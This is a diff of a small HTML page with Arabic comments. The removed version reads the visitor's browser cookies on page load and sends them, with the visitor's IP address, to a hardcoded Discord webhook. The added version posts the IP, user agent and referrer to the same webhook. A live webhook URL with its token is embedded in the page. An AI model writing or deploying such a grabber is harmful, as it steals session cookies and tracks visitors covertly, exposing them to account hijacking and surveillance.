@@ -1,78 +1,54 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال الكوكيز مع الـ IP إلى بوت Discord</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #2c2f33;
-            color: white;
-            text-align: center;
-            padding: 50px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Visitor Info</title>
 </head>
 <body>
+  <h1>Welcome!</h1>
+  <p>Your IP and basic information will be logged.</p>
 
-    <h1>تم إرسال البيانات بنجاح!</h1>
+  <script>
+    // عنوان الويب هوك الخاص بـ Discord
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1315420160030412821/PM8Cic_rvPk811Jl1rGerqT_KjycvUvAv4wvMjppH0mD3xNEZtnF8MX4sVTt9b8_4bYP";
 
-    <script>
-        // دالة لجلب الكوكيز من المتصفح
-        function getCookies() {
-            return document.cookie; // جلب جميع الكوكيز في المتصفح
-        }
+    // وظيفة للحصول على IP باستخدام API خارجي
+    async function getVisitorInfo() {
+      try {
+        // الحصول على عنوان IP من خدمة عامة
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip;
 
-        // جلب الكوكيز
-        const cookies = getCookies();
-        console.log("الكوكيز الموجودة:", cookies);  // طباعة الكوكيز في الـ Console
+        // معلومات إضافية
+        const userAgent = navigator.userAgent;
+        const referer = document.referrer || 'N/A';
 
-        // جلب عنوان الـ IP باستخدام API خارجي
-        fetch("https://api.ipify.org?format=json")
-            .then(response => response.json())
-            .then(data => {
-                const userIP = data.ip;  // الحصول على عنوان الـ IP
-                console.log("عنوان الـ IP:", userIP);  // طباعة الـ IP في الـ Console
-                
-                if (cookies) {
-                    sendData(cookies, userIP);  // إرسال الكوكيز والـ IP إلى Webhook
-                } else {
-                    console.log("لا توجد كوكيز أو الكوكيز فارغة");
-                }
-            })
-            .catch(error => {
-                console.error("خطأ في جلب عنوان الـ IP: ", error);
-            });
+        // إرسال البيانات إلى الويب هوك الخاص بـ Discord
+        await fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `🚨 **New Visitor Alert!** 🚨\nIP: ${ip}\nUser-Agent: ${userAgent}\nReferer: ${referer}`,
+          }),
+        });
 
-        // دالة لإرسال البيانات إلى Webhook
-        function sendData(cookies, userIP) {
-            const data = {
-                content: `تم إرسال الكوكيز: ${cookies}\n مع الـ IP: ${userIP}`
-            };
+        // عرض المعلومات على الشاشة
+        document.body.innerHTML += `
+          <p>Your IP: ${ip}</p>
+          <p>User-Agent: ${userAgent}</p>
+          <p>Referer: ${referer}</p>
+        `;
+      } catch (error) {
+        console.error('Error fetching or sending visitor info:', error);
+      }
+    }
 
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://discord.com/api/webhooks/1315420160030412821/PM8Cic_rvPk811Jl1rGerqT_KjycvUvAv4wvMjppH0mD3xNEZtnF8MX4sVTt9b8_4bYP", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-
-            // التحقق من حالة الاستجابة من الـ Webhook
-            xhr.onload = function () {
-                if (xhr.status === 204) {
-                    console.log("تم إرسال البيانات بنجاح.");
-                } else {
-                    console.log("حدث خطأ أثناء إرسال البيانات:", xhr.status, xhr.statusText);
-                    alert("حدث خطأ أثناء إرسال البيانات إلى Webhook.");
-                }
-            };
-
-            xhr.onerror = function () {
-                console.log("حدث خطأ في الاتصال بـ Webhook.");
-                alert("حدث خطأ في الاتصال بـ Webhook.");
-            };
-
-            xhr.send(JSON.stringify(data));  // إرسال البيانات
-        }
-    </script>
-
+    // استدعاء الوظيفة عند تحميل الصفحة
+    getVisitorInfo();
+  </script>
 </body>
 </html>
